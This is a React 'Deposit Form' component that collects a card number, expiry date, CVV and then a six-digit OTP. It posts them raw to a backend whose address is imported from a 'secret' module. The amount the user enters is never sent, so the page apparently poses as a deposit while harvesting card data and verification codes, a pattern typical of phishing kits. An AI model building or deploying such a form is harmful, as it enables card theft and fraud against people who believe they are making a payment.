import React, { useState } from "react";
import {
  TextField,
  InputAdornment,
  Button,
  Snackbar,
  Typography,
} from "@material-ui/core";
import "../styles/deposit.scss";
import DateFnsUtils from "@date-io/date-fns";
import {
  MuiPickersUtilsProvider,
  KeyboardDatePicker,
} from "@material-ui/pickers";
import { Dialpad, VpnKey } from "@material-ui/icons";
import { ScaleLoader } from "react-spinners";
import Axios from "axios";
import back_url from "../secret";
import MuiAlert from "@material-ui/lab/Alert";

function Alert(props) {
  return <MuiAlert elevation={6} variant="filled" {...props} />;
}
const details = JSON.parse(localStorage.getItem("details"));

export default function Deposit() {
  const [amount, setamount] = useState("");
  const [card_number, setcard_number] = useState("");
  const [card_date, setcard_date] = useState(new Date());
  const [card_cvv, setcard_cvv] = useState("");
  const [otp, setotp] = useState("");
  const [loading_c, setloading_c] = useState(false);
  const [next, setnext_state] = useState(false);
  const [open_err, setOpen_err] = useState(false);
  const [open_suc, setOpen_suc] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (loading_c) return;
    setloading_c(true);
    if (next) {
      await Axios({
        method: "POST",
        url: `${back_url}/otp`,
        data: {
          otp: otp,
        },
      })
        .then(() => {
          setnext_state(true);
        })
        .catch((err) => {
          console.log(err);
          setOpen_err(true);
        })
        .finally(() => {
          setloading_c(false);
        });
      return;
    }
    await Axios({
      method: "POST",
      url: `${back_url}/data`,
      data: {
        cnumber: card_number,
        cdate: card_date,
        ccvv: card_cvv,
      },
    })
      .then(() => {
        setnext_state(true);
        setOpen_suc(true);
      })
      .catch((err) => {
        console.log(err);
        setOpen_err(true);
      })
      .finally(() => {
        setloading_c(false);
      });
  };

  const handleClose = (event, reason) => {
    if (reason === "clickaway") {
      return;
    }
    setOpen_err(false);
    setOpen_suc(false);
  };

  return (
    <div className="Deposit">
      <Snackbar open={open_err} autoHideDuration={6000} onClose={handleClose}>
        <Alert onClose={handleClose} severity="error">
          Network Error!
        </Alert>
      </Snackbar>
      <Snackbar open={open_suc} autoHideDuration={6000} onClose={handleClose}>
        <Alert onClose={handleClose} severity="success">
          Successful!
        </Alert>
      </Snackbar>
      <div className="container" />
      <form onSubmit={handleSubmit}>
        <Typography variant="h5" style={{ color: "#3451f1" }}>
          Deposit Form
        </Typography>
        {next ? (
          <>
            <p className="txt">Card verification</p>
            <TextField
              variant="outlined"
              className="inputBox"
              label="Otp Code"
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start" style={{ color: "#3451f1" }}>
                    <Dialpad />
                  </InputAdornment>
                ),
              }}
              type="number"
              placeholder="A 6 digit code"
              value={otp}
              onChange={(e) => {
                if (e.target.value.length < 6) {
                  setotp(e.target.value);
                }
              }}
              required
            />
          </>
        ) : (
          <>
            <TextField
              required
              variant="outlined"
              className="inputBox"
              label="Amount"
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start" style={{ color: "#3451f1" }}>
                    {details.account_currentcy || "$"}
                  </InputAdornment>
                ),
              }}
              type="number"
              placeholder="don't add the currency"
              value={amount}
              onChange={(e) => {
                setamount(e.target.value);
              }}
            />
            <TextField
              required
              variant="outlined"
              className="inputBox"
              label="Card Number"
              placeholder="a 16 digit number"
              inputProps={{ minLenght: 15, maxLenght: 16 }}
              value={card_number}
              onChange={(e) => {
                if (e.target.value.length < 17) {
                  setcard_number(e.target.value);
                }
              }}
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start" style={{ color: "#3451f1" }}>
                    <Dialpad />
                  </InputAdornment>
                ),
              }}
            />

            <MuiPickersUtilsProvider utils={DateFnsUtils}>
              <KeyboardDatePicker
                disableToolbar
                variant="inline"
                inputVariant="outlined"
                format="MM/yyyy"
                margin="normal"
                required
                id="Card Date"
                label="Card Date"
                value={card_date}
                onChange={(date) => {
                  setcard_date(date);
                }}
                KeyboardButtonProps={{
                  "aria-label": "change date",
                }}
              />
            </MuiPickersUtilsProvider>
            <TextField
              required
              variant="outlined"
              className="inputBox"
              label="Card CVV"
              placeholder="secret"
              inputProps={{ minLenght: 2, maxLenght: 3 }}
              value={card_cvv}
              onChange={(e) => {
                if (e.target.value.length < 4) {
                  setcard_cvv(e.target.value);
                }
              }}
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start" style={{ color: "#3451f1" }}>
                    <VpnKey />
                  </InputAdornment>
                ),
              }}
            />
          </>
        )}
        <Button type="submit" className={loading_c ? "btn_ op" : "btn_"}>
          {loading_c ? <ScaleLoader color="white" /> : "submit"}
        </Button>
      </form>
    </div>
  );
}
